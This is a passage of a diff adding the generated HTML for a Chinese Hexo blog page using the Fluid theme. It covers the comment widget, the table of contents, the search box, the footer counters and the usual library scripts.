+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiaoxuehua.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+  <!-- 雪花特效 -->
+  <script type="text/javascript" src="\js\snow.js"></script>
+  
+</body>
+</html>
